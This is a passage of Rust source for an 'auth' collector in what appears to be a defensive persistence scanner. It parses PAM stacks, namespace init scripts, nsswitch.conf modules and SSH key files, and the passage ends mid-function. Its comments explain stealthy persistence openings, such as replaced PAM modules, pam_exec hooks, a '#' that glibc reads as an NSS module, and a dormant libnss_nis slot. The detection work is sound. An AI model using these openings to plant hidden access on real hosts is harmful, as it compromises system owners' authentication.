//! Authentication-path persistence: PAM stacks, SSH login material, sudoers.
//!
//! Three mechanism classes in one collector because they share their source
//! material's shape: line-oriented text read at credential time. Every parser
//! here works over bytes and converts to String only at the field boundary, so
//! a rule carrying invalid UTF-8 survives as evidence rather than becoming
//! replacement characters.

use crate::text::{Padding, base64_decode, base64_encode_unpadded, lossy, short_hash};
use std::collections::{BTreeMap, BTreeSet};
use std::ffi::{OsStr, OsString};
use std::os::unix::ffi::{OsStrExt, OsStringExt};
use std::path::{Path, PathBuf};

use super::{expand_glob, glob_match, include_rel};
use crate::entry::{Enablement, Entry, Flag, Kind, Trigger};
use crate::scan::{Collector, Ctx};

pub struct Auth;

impl Collector for Auth {
    fn name(&self) -> &'static str {
        "auth"
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        let mut out = Vec::new();
        pam(cx, &mut out);
        namespace_init(cx, &mut out);
        nss(cx, &mut out);
        ssh(cx, &mut out);
        sudoers(cx, &mut out);
        groups(cx, &mut out);
        sudo_conf(cx, &mut out);
        doas(cx, &mut out);
        ssh_client(cx, &mut out);
        out
    }
}

// ---------------------------------------------------------------- byte tools

fn is_ws(b: u8) -> bool {
    matches!(b, b' ' | b'\t' | b'\r' | 0x0b | 0x0c)
}

fn trim(mut s: &[u8]) -> &[u8] {
    while let [f, rest @ ..] = s {
        if is_ws(*f) {
            s = rest;
        } else {
            break;
        }
    }
    while let [rest @ .., l] = s {
        if is_ws(*l) {
            s = rest;
        } else {
            break;
        }
    }
    s
}

fn words(s: &[u8]) -> Vec<&[u8]> {
    s.split(|b| is_ws(*b)).filter(|w| !w.is_empty()).collect()
}


fn eqi(a: &[u8], b: &str) -> bool {
    a.eq_ignore_ascii_case(b.as_bytes())
}

fn split_once(s: &[u8], b: u8) -> Option<(&[u8], &[u8])> {
    let i = s.iter().position(|c| *c == b)?;
    Some((&s[..i], &s[i + 1..]))
}

/// A path built from the original bytes, not from a lossy decode: a target
/// whose name is not UTF-8 is still the path the mechanism will execute.
fn bpath(b: &[u8]) -> PathBuf {
    PathBuf::from(OsString::from_vec(b.to_vec()))
}

/// The executable a command line names, where it names one syntactically.
fn first_path(cmd: &[u8]) -> Option<PathBuf> {
    let w = words(cmd).into_iter().next()?;
    w.contains(&b'/').then(|| bpath(w))
}

fn join_ws(parts: &[&[u8]]) -> Vec<u8> {
    let mut v = Vec::new();
    for (i, p) in parts.iter().enumerate() {
        if i > 0 {
            v.push(b' ');
        }
        v.extend_from_slice(p);
    }
    v
}

/// Physical lines joined across a trailing backslash, the continuation rule
/// both pam.conf and sudoers use.
fn logical_lines(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut out: Vec<Vec<u8>> = Vec::new();
    let mut open = false;
    for raw in bytes.split(|b| *b == b'\n') {
        let line = raw.strip_suffix(b"\r").unwrap_or(raw);
        let joined = line.iter().rev().take_while(|b| **b == b'\\').count() % 2 == 1;
        let body = if joined { &line[..line.len() - 1] } else { line };
        match out.last_mut() {
            Some(prev) if open => prev.extend_from_slice(body),
            _ => out.push(body.to_vec()),
        }
        open = joined;
    }
    out
}


/// A stable, whitespace-insensitive rendering of a rule, so that reindenting a
/// file does not re-identify every entry in it.
fn normalized(line: &[u8]) -> Vec<u8> {
    join_ws(&words(line))
}

fn flag_non_utf8(e: &mut Entry, bytes: &[u8]) {
    if std::str::from_utf8(bytes).is_err() {
        e.flag(Flag::EncodingAnomaly);
    }
}

// ------------------------------------------------------------------- part A

/// Where a bare `pam_unix.so` resolves. libpam looks in one directory, the
/// one it was built with; the multiarch and lib64 ones come first so that a
/// copy planted in an unused /lib/security is not taken for the real module.
const PAM_STD_DIRS: &[&str] = &[
    "lib/x86_64-linux-gnu/security",
    "usr/lib/x86_64-linux-gnu/security",
    "lib/aarch64-linux-gnu/security",
    "usr/lib/aarch64-linux-gnu/security",
    "lib64/security",
    "usr/lib64/security",
    "lib/security",
    "usr/lib/security",
];

/// libpam's own size is tens of kilobytes; this is only a ceiling.
const LIBPAM_CAP: usize = 4 << 20;

/// libpam's module directory on this root. libpam is built with the one
/// directory it loads from and carries that path as a string, so it is read
/// from there: a directory planted with a link to pam_permit.so is no longer
/// taken for the real one and no longer hides the real pam_unix.so behind it.
/// Where libpam cannot be read, or names none of the standard directories,
/// the first standard one holding pam_permit.so (which every PAM installation
/// ships) is the best available guess.
fn pam_module_dir(cx: &mut Ctx) -> Option<&'static str> {
    for d in PAM_STD_DIRS {
        // libpam sits beside the `security` directory it loads from.
        let Some(lib) = Path::new(d).parent().map(|p| p.join("libpam.so.0")) else { continue };
        if !cx.root.exists(&lib) {
            continue;
        }
        let Some(bytes) = cx.read_capped(&lib, LIBPAM_CAP) else { continue };
        if let Some(named) = PAM_STD_DIRS.iter().copied().find(|d| holds_path(&bytes, d)) {
            return Some(named);
        }
    }
    PAM_STD_DIRS.iter().copied().find(|d| cx.root.exists(Path::new(d).join("pam_permit.so")))
}

/// Whether `bytes` holds `/<dir>` as a string of its own, ending at a NUL or
/// a `/`. Anchoring both ends keeps `/usr/lib/security` from being found
/// inside `/opt/usr/lib/security2`.
fn holds_path(bytes: &[u8], dir: &str) -> bool {
    let needle = format!("/{dir}");
    let needle = needle.as_bytes();
    bytes.windows(needle.len() + 1).enumerate().any(|(i, w)| {
        w.starts_with(needle) && matches!(w[needle.len()], 0 | b'/') && (i == 0 || bytes[i - 1] == 0)
    })
}

fn pam_type(t: &[u8]) -> Option<&'static str> {
    // A leading '-' means "skip silently if the module is missing".
    let t = t.strip_prefix(b"-").unwrap_or(t);
    ["auth", "account", "session", "password"].into_iter().find(|n| eqi(t, n))
}

/// Whitespace-separated, except that a bracketed control expression such as
/// `[success=1 default=ignore]` is one token however many spaces it contains.
fn pam_tokens(line: &[u8]) -> Vec<&[u8]> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < line.len() {
        while i < line.len() && is_ws(line[i]) {
            i += 1;
        }
        if i >= line.len() {
            break;
        }
        let start = i;
        if line[i] == b'[' {
            i += 1;
            while i < line.len() && line[i] != b']' {
                i += 1;
            }
            if i < line.len() {
                i += 1;
            }
        } else {
            while i < line.len() && !is_ws(line[i]) {
                i += 1;
            }
        }
        out.push(&line[start..i]);
    }
    out
}

fn module_is_standard(module: &[u8]) -> bool {
    if !module.contains(&b'/') {
        return true;
    }
    let p = bpath(module);
    let Some(dir) = p.parent() else { return false };
    let dir = dir.strip_prefix("/").unwrap_or(dir);
    PAM_STD_DIRS.iter().any(|d| Path::new(d) == dir)
}

fn is_pam_exec_opt(a: &[u8]) -> bool {
    const OPTS: &[&str] = &[
        "debug",
        "quiet",
        "seteuid",
        "expose_authtok",
        "use_first_pass",
        "stdout",
        "stderr",
        "quiet_fail",
        "quiet_success",
    ];
    OPTS.iter().any(|o| eqi(a, o)) || a.starts_with(b"log=") || a.starts_with(b"type=")
}

/// The databases glibc reads from nsswitch.conf (nss/databases.def). A line
/// naming any other, `sudoers:` or `automount:` among them, is read by some
/// other program with its own backends and loads no libnss module.
const NSS_DATABASES: [&[u8]; 17] = [
    b"aliases",
    b"ethers",
    b"group",
    b"group_compat",
    b"gshadow",
    b"hosts",
    b"initgroups",
    b"netgroup",
    b"networks",
    b"passwd",
    b"passwd_compat",
    b"protocols",
    b"publickey",
    b"rpc",
    b"services",
    b"shadow",
    b"shadow_compat",
];

/// Where the loader finds a library named without a slash once its cache has
/// no answer, by layout: Debian's multiarch directories, or Fedora's lib64.
const LOADER_DIRS: [&[&str]; 3] = [
    &["lib/x86_64-linux-gnu", "usr/lib/x86_64-linux-gnu", "lib", "usr/lib"],
    &["lib/aarch64-linux-gnu", "usr/lib/aarch64-linux-gnu", "lib", "usr/lib"],
    &["lib64", "usr/lib64"],
];

/// Tried before each directory itself; which ones apply depends on the CPU.
const HWCAPS: [&str; 3] = ["glibc-hwcaps/x86-64-v4", "glibc-hwcaps/x86-64-v3", "glibc-hwcaps/x86-64-v2"];

/// nsswitch.conf, parsed as glibc 2.39 parses it (nss_database.c,
/// nss_action_parse.c): a database name ends at whitespace or `:`, any run
/// of both follows it, and each source is the bytes up to whitespace or `[`,
/// with an optional bracketed action list. There is no comment syntax after
/// the database name: `passwd: files # nis` makes `#` and `nis` sources, and
/// glibc loads libnss_#.so.2 and libnss_nis.so.2. A line only reads as a
/// comment because `#...` is not a database.
///
/// Each module is loaded into whatever process does a lookup: sshd, sudo,
/// login, cron. One entry per module, with the databases that name it.
fn nss(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let rel = Path::new("etc/nsswitch.conf");
    let Some(bytes) = cx.read_capped(rel, 64 * 1024) else { return };
    let mut modules: Vec<(Vec<u8>, Vec<String>, bool)> = Vec::new();
    for raw in bytes.split(|b| *b == b'\n') {
        let line = raw.trim_ascii_start();
        let end = line.iter().position(|b| b.is_ascii_whitespace() || *b == b':').unwrap_or(line.len());
        let (db, mut rest) = line.split_at(end);
        if db.is_empty() || rest.is_empty() || !NSS_DATABASES.contains(&db) {
            continue;
        }
        let skip = rest.iter().position(|b| !b.is_ascii_whitespace() && *b != b':').unwrap_or(rest.len());
        rest = &rest[skip..];
        let mut after_hash = false;
        loop {
            rest = rest.trim_ascii_start();
            if rest.is_empty() {
                break;
            }
            let end = rest.iter().position(|b| b.is_ascii_whitespace() || *b == b'[').unwrap_or(rest.len());
            let name = &rest[..end];
            rest = rest[end..].trim_ascii_start();
            if rest.first() == Some(&b'[') {
                rest = &rest[rest.iter().position(|b| *b == b']').map_or(rest.len(), |i| i + 1)..];
            }
            if name.is_empty() {
                continue;
            }
            after_hash |= name.starts_with(b"#");
            // Built into libc since 2.34; no library is opened for them.
            if name == b"files" || name == b"dns" {
                continue;
            }
            let db = lossy(db);
            match modules.iter_mut().find(|m| m.0 == name) {
                Some(m) => {
                    if !m.1.contains(&db) {
                        m.1.push(db);
                    }
                    m.2 |= after_hash;
                }
                None => modules.push((name.to_vec(), vec![db], after_hash)),
            }
        }
    }
    if modules.is_empty() {
        return;
    }

    let mut dirs: Vec<String> = super::ld_so_conf_dirs(cx).into_iter().map(|(d, _)| d).collect();
    let layout = LOADER_DIRS.iter().find(|l| cx.root.exists(l[0])).copied().unwrap_or(&[]);
    dirs.extend(layout.iter().map(|d| format!("/{d}")));
    for (name, databases, after_hash) in modules {
        let file = [b"libnss_".as_slice(), &name, b".so.2"].concat();
        let file = Path::new(OsStr::from_bytes(&file));
        // ponytail: the loader's cache is not read; ld.so.conf's directories
        // stand in for it, ahead of the defaults, as the cache is consulted
        // first.
        // Merged /usr makes /lib/x and /usr/lib/x one directory, searched
        // once under the first name.
        let mut seen = BTreeSet::new();
        let mut found: Vec<PathBuf> = Vec::new();
        for d in &dirs {
            let d = Path::new(d.trim_start_matches('/'));
            for dir in HWCAPS.iter().map(|h| d.join(h)).chain(std::iter::once(d.to_path_buf())) {
                let Ok(id) = cx.root.dir_identity(&dir) else { continue };
                if seen.insert(id) && cx.root.exists(dir.join(file)) {
                    found.push(dir.join(file));
                }
            }
        }
        let mut e = cx.entry(Kind::NssModule, rel, lossy(&name));
        e.trigger = Trigger::Always;
        e.note("databases", databases.join(", "));
        e.note("library", file.to_string_lossy());
        if after_hash {
            // What reads as a comment to a person is a source to glibc.
            e.note("after_hash", "true");
        }
        match found.first() {
            Some(lib) => {
                e.enabled = Enablement::Enabled;
                e.target_path = Some(cx.root.abs(lib));
                if found.len() > 1 {
                    let all: Vec<String> = found.iter().map(|p| cx.root.abs(p).display().to_string()).collect();
                    e.note("candidates", all.join(", "));
                }
            }
            // glibc skips a source whose library is missing, silently. Stock
            // Ubuntu names nis with no libnss_nis installed: dormant, and a
            // library dropped under that name starts loading.
            None => {
                e.enabled = Enablement::Disabled;
                e.note("library_missing", "true");
            }
        }
        if std::str::from_utf8(&name).is_err() {
            e.flag(Flag::EncodingAnomaly);
        }
        out.push(e);
    }
}

/// libpam reads a service's stack from /etc/pam.d, and from the vendor
/// directory only when /etc/pam.d has no file of that name.
const PAM_DIRS: [&str; 2] = ["etc/pam.d", "usr/lib/pam.d"];

/// A line that pulls in another stack. A bare name is a file in a stack
/// directory, which is enumerated in its own right; a path is a file libpam
/// reads from wherever it is, so that becomes the entry's target.
fn pam_include(cx: &mut Ctx, rel: &Path, service: &str, keyword: &str, stack: &[u8], shadowed_by: &Option<String>, shadows: &Option<String>) -> Entry {
    let mut e = cx.entry(Kind::Pam, rel, format!("{service}:{keyword}:{}", lossy(stack)));
    e.trigger = Trigger::Auth;
    e.enabled = if shadowed_by.is_some() { Enablement::Disabled } else { Enablement::Enabled };
    if let Some(by) = shadowed_by {
        e.note("shadowed_by", by.clone());
    }
    if let Some(paths) = shadows {
        e.note("shadows", paths.clone());
    }
    e.note("service", service);
    e.note("include", lossy(stack));
    if stack.contains(&b'/') {
        e.target_path = Some(bpath(stack));
    }
    e
}

fn pam(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let module_dir = pam_module_dir(cx);
    let mut files = vec![(PathBuf::from("etc/pam.conf"), None)];
    // Each service's files, the one libpam uses first.
    let mut copies: BTreeMap<OsString, Vec<PathBuf>> = BTreeMap::new();
    for dir in PAM_DIRS {
        for ent in cx.dir(dir) {
            if !ent.is_dir {
                let rel = Path::new(dir).join(&ent.name);
                copies.entry(ent.name.clone()).or_default().push(rel.clone());
                files.push((rel, Some(ent.name)));
            }
        }
    }

    for (rel, service_file) in files {
        let Some(bytes) = cx.read(&rel) else { continue };
        // A vendor stack replaced by one in /etc never runs. It is still
        // reported, off, so the replacement does not read as a second stack.
        let others = service_file.and_then(|n| copies.get(&n)).filter(|c| c.len() > 1);
        let shown = |p: &PathBuf| cx.root.abs(p).display().to_string();
        let (shadowed_by, shadows) = match others {
            Some(c) if c[0] != rel => (Some(shown(&c[0])), None),
            Some(c) => (None, Some(c[1..].iter().map(shown).collect::<Vec<_>>().join(", "))),
            None => (None, None),
        };
        let filename = rel.file_name().map(|n| lossy(n.as_encoded_bytes())).unwrap_or_default();

        for line in logical_lines(&bytes) {
            let toks = pam_tokens(&line);
            if toks.is_empty() || toks[0].first() == Some(&b'#') {
                continue;
            }
            // pam.conf prefixes each rule with its service name; pam.d takes
            // the service from the filename. Detect which by where the type is.
            let (service, rule) = if pam_type(toks[0]).is_some() {
                (filename.clone(), &toks[..])
            } else if toks.len() > 1 && pam_type(toks[1]).is_some() {
                (lossy(toks[0]), &toks[1..])
            } else if eqi(toks[0], "@include") && toks.len() > 1 {
                out.push(pam_include(cx, &rel, &filename, "@include", toks[1], &shadowed_by, &shadows));
                continue;
            } else {
                continue;
            };
            if rule.len() < 3 {
                continue;
            }
            let Some(mtype) = pam_type(rule[0]) else { continue };
            let (control, module, args) = (rule[1], rule[2], &rule[3..]);
            if eqi(control, "include") || eqi(control, "substack") {
                // Not a module: `module` names another stack, which is read
                // as a file of its own where it is one of the stacks.
                let kind = format!("{mtype} {}", lossy(control).to_ascii_lowercase());
                out.push(pam_include(cx, &rel, &service, &kind, module, &shadowed_by, &shadows));
                continue;
            }

            let base = module.rsplit(|b| *b == b'/').next().unwrap_or(module);
            let prog = if eqi(base, "pam_exec.so") {
                args.iter().position(|a| !is_pam_exec_opt(a))
            } else {
                None
            };
            let nonstandard = !module_is_standard(module);

            let name = match prog {
                Some(i) => format!("{service}:{mtype}:{}:{}", lossy(module), lossy(args[i])),
                None => format!("{service}:{mtype}:{}", lossy(module)),
            };
            let mut e = cx.entry(Kind::Pam, &rel, name);
            e.trigger = Trigger::Auth;
            e.enabled = if shadowed_by.is_some() { Enablement::Disabled } else { Enablement::Enabled };
            if let Some(by) = &shadowed_by {
                e.note("shadowed_by", by.clone());
            }
            if let Some(paths) = &shadows {
                e.note("shadows", paths.clone());
            }
            e.note("service", service);
            e.note("module_type", mtype);
            e.note("control", lossy(control));
            e.note("module", lossy(module));
            if !args.is_empty() {
                e.note("module_args", lossy(&join_ws(args)));
            }
            if nonstandard {
                e.flag(Flag::NonStandardLocation);
                e.target_path = Some(bpath(module));
            } else {
                // Every module a stack loads is checked against its package:
                // a replaced pam_unix.so sits in the standard directory and
                // is otherwise indistinguishable from the real one.
                let rel = match (module.contains(&b'/'), module_dir) {
                    (true, _) => Some(bpath(module).strip_prefix("/").map(Path::to_path_buf).unwrap_or_else(|_| bpath(module))),
                    (false, Some(dir)) => Some(Path::new(dir).join(bpath(module))),
                    (false, None) => None,
                };
                match rel {
                    Some(rel) if cx.root.exists(&rel) => e.target_path = Some(cx.root.abs(&rel)),
                    // libpam fails the line, or skips it under a leading `-`;
                    // a module that is not there runs nothing.
                    _ => e.note("module_missing", "true"),
                }
            }
            if let Some(i) = prog {
                // pam_exec execs argv directly, so rejoining the argument
                // vector with single spaces is a faithful rendering of it.
                e.command = Some(join_ws(&args[i..]));
                e.target_path = Some(bpath(args[i]));
                for opt in ["seteuid", "quiet", "stdout", "stderr", "expose_authtok", "debug"] {
                    if args[..i].iter().any(|a| eqi(a, opt)) {
                        e.note(&format!("pam_exec.{opt}"), "true");
                    }
                }
                for a in &args[..i] {
                    if let Some(v) = a.strip_prefix(b"log=") {
                        e.note("pam_exec.log", lossy(v));
                    }
                }
            }
            flag_non_utf8(&mut e, &line);
            out.push(e);
        }
    }
}

// ------------------------------------------------------------ pam_namespace

/// A namespace.conf line split the way pam_namespace's argv_parse splits
/// it: whitespace separates, `"` quotes without being kept, and a
/// backslash takes the next byte, `\n`, `\t` and `\b` as their controls.
/// Everything from the first `#` on is gone before it is split.
fn namespace_words(line: &[u8]) -> Vec<Vec<u8>> {
    let line = &line[..line.iter().position(|b| *b == b'#').unwrap_or(line.len())];
    let mut out: Vec<Vec<u8>> = Vec::new();
    let (mut word, mut quoted, mut open) = (Vec::new(), false, false);
    let mut i = 0;
    while i < line.len() {
        let c = line[i];
        i += 1;
        if quoted {
            if c == b'"' {
                quoted = false;
            } else {
                word.push(c);
            }
            continue;
        }
        if c.is_ascii_whitespace() || c == 0x0b {
            if open {
                out.push(std::mem::take(&mut word));
                open = false;
            }
            continue;
        }
        open = true;
        match c {
            b'"' => quoted = true,
            b'\\' => match line.get(i) {
                None => word.push(b'\\'),
                Some(&n) => {
                    i += 1;
                    word.push(match n {
                        b'n' => b'\n',
                        b't' => b'\t',
                        b'b' => 0x08,
                        _ => n,
                    });
                }
            },
            _ => word.push(c),
        }
    }
    if open {
        out.push(word);
    }
    out
}

/// A polyinstantiated directory pam_namespace would set up: the line that
/// names it, and the script it runs for it, `None` for the default one or
/// for none at all under `noinit`.
struct Polydir {
    rel: PathBuf,
    dir: String,
    script: Option<Vec<u8>>,
    noinit: bool,
}

/// The directories namespace.conf and namespace.d/*.conf set up, as
/// pam_namespace's process_line accepts them: a polydir, an instance
/// prefix and a method, the method one it knows with its flags after
/// colons, matched by prefix as the module matches them. A line it would
/// skip, with a relative path or a `..`, is not a directory.
fn polydirs(cx: &mut Ctx) -> Vec<Polydir> {
    let mut files = vec![PathBuf::from("etc/security/namespace.conf")];
    let dir = Path::new("etc/security/namespace.d");
    let mut drop_ins: Vec<PathBuf> =
        cx.dir(dir).into_iter().filter(|e| !e.is_dir && e.name.as_encoded_bytes().ends_with(b".conf")).map(|e| dir.join(e.name)).collect();
    drop_ins.sort();
    files.extend(drop_ins);
    let mut out = Vec::new();
    for rel in files {
        let Some(bytes) = cx.read_capped(&rel, 256 * 1024) else { continue };
        for line in bytes.split(|b| *b == b'\n') {
            let w = namespace_words(line);
            let [polydir, prefix, method, ..] = w.as_slice() else { continue };
            let mut parts = method.split(|b| *b == b':');
            let kind = parts.next().unwrap_or_default();
            if !["user", "context", "level", "tmpdir", "tmpfs"].iter().any(|m| kind == m.as_bytes()) {
                continue;
            }
            // $HOME and $USER expand to an absolute home and a name.
            let absolute = |p: &[u8]| p.starts_with(b"/") || p.starts_with(b"$HOME");
            if !absolute(polydir) || (kind != b"tmpfs" && !absolute(prefix)) || polydir.windows(2).any(|w| w == b"..") || prefix.windows(2).any(|w| w == b"..") {
                continue;
            }
            let (mut script, mut noinit) = (None, false);
            for flag in parts {
                if flag.starts_with(b"noinit") {
                    noinit = true;
                } else if let Some(rest) = flag.strip_prefix(b"iscript") {
                    // Relative to namespace.d; an empty one leaves the default.
                    match rest.strip_prefix(b"=") {
                        Some(p) if p.starts_with(b"/") => script = Some(p.to_vec()),
                        Some(p) if !p.is_empty() => script = Some([b"/etc/security/namespace.d/".as_slice(), p].concat()),
                        _ => {}
                    }
                }
            }
            out.push(Polydir { rel: rel.clone(), dir: lossy(polydir), script, noinit });
        }
    }
    out
}

/// The scripts pam_namespace runs as root, each login, for every directory
/// it polyinstantiates: /etc/security/namespace.init, or the one a
/// directory's `iscript=` names instead, unless `noinit` says none. They run
/// only where a session stack loads pam_namespace.so and a directory uses
/// them, and only when executable; the module fails the session otherwise.
fn namespace_init(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let services: BTreeSet<String> = out
        .iter()
        .filter(|e| {
            e.kind == Kind::Pam
                && e.enabled == Enablement::Enabled
                && e.raw.get("module_type").is_some_and(|t| t == "session")
                && e.raw.get("module").is_some_and(|m| m.rsplit('/').next() == Some("pam_namespace.so"))
        })
        .filter_map(|e| e.raw.get("service").cloned())
        .collect();
    let dirs = polydirs(cx);

    let mut scripts: BTreeMap<Vec<u8>, (PathBuf, Vec<String>)> = BTreeMap::new();
    let default = b"/etc/security/namespace.init".to_vec();
    scripts.insert(default.clone(), (PathBuf::from("etc/security/namespace.init"), Vec::new()));
    for d in &dirs {
        if d.noinit {
            continue;
        }
        let script = d.script.clone().unwrap_or_else(|| default.clone());
        scripts.entry(script).or_insert_with(|| (d.rel.clone(), Vec::new())).1.push(d.dir.clone());
    }

    for (script, (source, used_by)) in scripts {
        let target = bpath(&script);
        let target_rel = target.strip_prefix("/").unwrap_or(&target).to_path_buf();
        let exists = cx.root.exists(&target_rel);
        // The default script is reported where it exists; one a line names,
        // whether or not it does.
        if script == default && !exists {
            continue;
        }
        let name = if script == default { "namespace.init".to_string() } else { format!("namespace.init:{}", lossy(&script)) };
        let mut e = cx.entry(Kind::Pam, &source, name);
        e.trigger = Trigger::Login;
        e.principal = Some("root".into());
        e.target_path = Some(cx.root.abs(&target_rel));
        e.command = Some(script.clone());
        e.note("pam_mechanism", "namespace.init");
        e.enabled = Enablement::Enabled;
        if services.is_empty() {
            e.enabled = Enablement::Disabled;
            e.append_note("not_run", "no session stack loads pam_namespace.so");
        } else {
            e.note("services", services.iter().cloned().collect::<Vec<_>>().join(","));
        }
        if used_by.is_empty() {
            e.enabled = Enablement::Disabled;
            e.append_note("not_run", "no polyinstantiated directory uses it");
        } else {
            e.note("polydirs", used_by.join(","));
        }
        if exists && cx.root.stat_follow(&target_rel).is_ok_and(|m| m.mode & 0o111 == 0) {
            e.enabled = Enablement::Disabled;
            e.append_note("not_run", "not executable, which fails the session");
        }
        flag_non_utf8(&mut e, &script);
        out.push(e);
    }
}

// ------------------------------------------------------------------- part B

struct KeyLine<'a> {
    options: Option<&'a [u8]>,
    keytype: &'a [u8],
    blob: &'a [u8],
    comment: &'a [u8],
}

fn is_key_type(t: &[u8]) -> bool {
    const P: &[&str] = &["ssh-", "ecdsa-", "sk-ecdsa-", "sk-ssh-", "rsa-sha2-", "webauthn-sk-"];
    P.iter().any(|p| t.len() > p.len() && t[..p.len()].eq_ignore_ascii_case(p.as_bytes()))
}

/// End of the first field, honouring OpenSSH's quoting: an option value may
/// contain spaces, commas and `\"`, and none of them end the options list.
fn quoted_token_end(s: &[u8]) -> usize {
    let mut i = 0;
    let mut quoted = false;
    while i < s.len() {
        match s[i] {
            b'"' => quoted = !quoted,
            b'\\' if quoted && s.get(i + 1) == Some(&b'"') => i += 1,
            c if is_ws(c) && !quoted => break,
            _ => {}
        }
        i += 1;
    }
    i
}

fn parse_key_line(line: &[u8]) -> Option<KeyLine<'_>> {
    let end = quoted_token_end(line);
    let (options, rest) = if is_key_type(&line[..end]) {
        (None, line)
    } else {
        (Some(&line[..end]), trim(&line[end..]))
    };
    let t1 = rest.iter().position(|b| is_ws(*b))?;
    let keytype = &rest[..t1];
    if !is_key_type(keytype) {
        return None;
    }
    let r2 = trim(&rest[t1..]);
    let t2 = r2.iter().position(|b| is_ws(*b)).unwrap_or(r2.len());
    let blob = &r2[..t2];
    if blob.is_empty() {
        return None;
    }
    Some(KeyLine { options, keytype, blob, comment: trim(&r2[t2..]) })
}

/// The comma-separated option list. Values may be bare or double-quoted, and a
/// quoted value may contain commas and spaces; `\"` is the only escape
/// OpenSSH recognises inside one.
fn parse_options(s: &[u8]) -> Vec<(Vec<u8>, Option<Vec<u8>>)> {
    let mut out = Vec::new();
    let mut i = 0;
    while i < s.len() {
        while i < s.len() && (s[i] == b',' || is_ws(s[i])) {
            i += 1;
        }
        if i >= s.len() {
            break;
        }
        let start = i;
        while i < s.len() && s[i] != b'=' && s[i] != b',' {
            i += 1;
        }
        let name = s[start..i].to_vec();
        let mut value = None;
        if s.get(i) == Some(&b'=') {
            i += 1;
            if s.get(i) == Some(&b'"') {
                i += 1;
                let mut v = Vec::new();
                while i < s.len() && s[i] != b'"' {
                    if s[i] == b'\\' && s.get(i + 1) == Some(&b'"') {
                        i += 1;
                    }
                    v.push(s[i]);
                    i += 1;
                }
                i += 1; // past the closing quote, or past the end if unterminated
                value = Some(v);
            } else {
                let vs = i;
                while i < s.len() && s[i] != b',' {
                    i += 1;
                }
                value = Some(s[vs..i].to_vec());
            }
        }
        out.push((name, value));
    }
    out
}

/// The identity of a key is the key, never its position in the file. This is
/// the same value `ssh-keygen -lf` prints, so an operator can match it against
/// a key inventory directly.
fn fingerprint(blob: &[u8]) -> (String, bool) {
    match base64_decode(blob, Padding::Optional) {
        Some(raw) if !raw.is_empty() => {
            use sha2::{Digest, Sha256};
            (format!("SHA256:{}", base64_encode_unpadded(&Sha256::digest(&raw))), true)
        }
        _ => (format!("key:{}", short_hash(blob)), false),
    }
}

/// sshd's default when no AuthorizedKeysFile is given.
const DEFAULT_KEY_FILES: &str = ".ssh/authorized_keys .ssh/authorized_keys2";

/// Where sshd looks for a user's keys, gathered while its configuration is
/// read. sshd takes the first value it obtains for a keyword; a Match block's
/// value applies only to what the block matches, so each is kept with its
/// criteria.
#[derive(Default)]
struct KeyFiles {
    global: Option<String>,
    scoped: Vec<(String, String)>,
}

fn ssh(cx: &mut Ctx, out: &mut Vec<Entry>) {
    let mut seen: BTreeSet<PathBuf> = BTreeSet::new();
    let mut keys = KeyFiles::default();
    sshd_config_file(cx, out, Path::new("etc/ssh/sshd_config"), None, 1, true, &mut seen, &mut keys);
    // What the main file's Include lines did not reach, sshd does not read.
    // It is reported, off, and gives no answer to where keys are kept: a file
    // named `x.conf.disabled` must not be able to move every account's keys.
    for ent in cx.dir("etc/ssh/sshd_config.d") {
        if ent.is_dir {
            continue;
        }
        let rel = Path::new("etc/ssh/sshd_config.d").join(&ent.name);
        if !seen.contains(&rel) {
            sshd_config_file(cx, out, &rel, None, 0, false, &mut seen, &mut keys);
        }
    }

    login_script(cx, out, Path::new("etc/ssh/sshrc"), "sshrc", None);

    let users = cx.users;
    for u in crate::users::one_per_home(users) {
        // The files AuthorizedKeysFile names for this account. The default
        // files are reported even where it names others, since a key left
        // in one is evidence, but as not read.
        let global = keys.global.clone().unwrap_or_else(|| DEFAULT_KEY_FILES.to_string());
        let mut files: Vec<(PathBuf, Option<String>)> =
            key_file_paths(&global, u).into_iter().map(|p| (p, None)).collect();
        for (criteria, value) in &keys.scoped {
            if match_may_apply(criteria, &u.name) {
                files.extend(key_file_paths(value, u).into_iter().map(|p| (p, Some(criteria.clone()))));
            }
        }
        for (rel, scope) in &files {
            authorized_keys(cx, out, rel, &u.name, Enablement::Enabled, scope.as_deref());
        }
        for f in [".ssh/authorized_keys", ".ssh/authorized_keys2"] {
            let rel = u.in_home(f);
            if !files.iter().any(|(p, _)| *p == rel) {
                authorized_keys(cx, out, &rel, &u.name, Enablement::Disabled, None);
            }
        }
        login_script(cx, out, &u.in_home(".ssh/rc"), "ssh-rc", Some(&u.name));
        user_environment(cx, out, &u.in_home(".ssh/environment"), &u.name);
    }
}

/// The root-relative files an AuthorizedKeysFile value names for one
/// account: whitespace-separated, `%%`, `%h`, `%u` and `%U` expanded, a
/// relative path taken from the home, `none` naming nothing.
fn key_file_paths(value: &str, u: &crate::users::User) -> Vec<PathBuf> {
    let home = format!("/{}", u.home.display());
    let uid = u.uid.map(|n| n.to_string()).unwrap_or_default();
    value
        .split_whitespace()
        .filter(|t| !t.eq_ignore_ascii_case("none"))
        .map(|t| {
            let mut expanded = String::new();
            let mut chars = t.chars();
            while let Some(c) = chars.next() {
                match (c, chars.clone().next()) {
                    ('%', Some(k @ ('%' | 'h' | 'u' | 'U'))) => {
                        chars.next();
                        expanded.push_str(match k {
                            '%' => "%",
                            'h' => &home,
                            'u' => &u.name,
                            _ => &uid,
                        });
                    }
                    _ => expanded.push(c),
                }
            }
            match expanded.strip_prefix('/') {
                Some(abs) => PathBuf::from(abs.trim_start_matches('/')),
                None => u.in_home(&expanded),
            }
        })
        .collect()
}

/// Whether a Match block could apply to this account. `User` lists are
/// matched as sshd matches them, `!` negating; any other criterion (Group,
/// Host, Address) depends on the connection, so it may.
fn match_may_apply(criteria: &str, user: &str) -> bool {
    let w: Vec<&str> = criteria.split_whitespace().collect();
    match w.as_slice() {
        [kw, list] if kw.eq_ignore_ascii_case("user") => {
            let pats: Vec<&str> = list.split(',').collect();
            let hit = |p: &str| glob_match(p.as_bytes(), user.as_bytes());
            !pats.iter().any(|p| p.strip_prefix('!').is_some_and(hit))
                && pats.iter().any(|p| !p.starts_with('!') && hit(p))
        }
        _ => true,
    }
}

fn authorized_keys(
    cx: &mut Ctx,
    out: &mut Vec<Entry>,
    rel: &Path,
    user: &str,
